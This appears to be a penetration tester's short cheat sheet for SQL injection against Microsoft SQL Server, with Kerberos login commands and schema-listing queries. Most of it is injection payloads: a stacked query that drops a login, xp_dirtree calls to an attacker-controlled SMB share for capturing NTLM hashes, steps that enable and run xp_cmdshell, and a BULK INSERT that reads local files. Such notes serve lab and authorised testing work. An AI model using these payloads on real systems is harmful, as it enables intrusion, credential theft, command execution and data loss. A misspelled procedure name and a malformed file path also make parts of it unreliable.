# MSSQL Injection
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

- Authenticate using Kerberos
```
python3 mssqlclient.py -k dc1.scrm.local
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

- Basic Syntax
```sql
SELECT * FROM master.dbo.sysdatabases --Show databases
SELECT * FROM db_name.INFORMATION_SCHEMA.TABLES --show tables in database


USE table_name
SELECT * FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = N'table_name' --Show columns in tables

```
- Testing parameters. Blind SQL injection method.
```sql
q=10' UNION SELECT 1,2,3....10 -- -
q=10' EXEC sp_droplogin 'user'; -- -
q=10' SELECT HOST_NAME() -- -
```


### Command Execution

- Ending query and testing for `xp_dirtree` to nc listening on SMB.
This can be used to potentially intercept NTLM hashes.
```sql
q=10'; EXEC xp_dirtree '\\10.10.16.7\smb_fileshare\test.txt' -- -
```

- Testing for potential xp_cmdshell.
```sql
q=10'; EXEC xp_cmdshell 'ping 10.10.16.7' -- -
```

- Attempting to configure cmdshell if root/admin is available.
```sql
q=10'; 
EXEC sp_confiure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;

--Then execute...
EXEC xp_cmdshell 'ping 10.10.16.7' -- -
```

- Attempting to access local files if root/admin is available.
```sql
a=10'
CREATE TABLE malicious (line varchar(8000));
BULK INSERT malicious FROM 'c:boot.ini';
DROP TABLE malicious; -- -
```
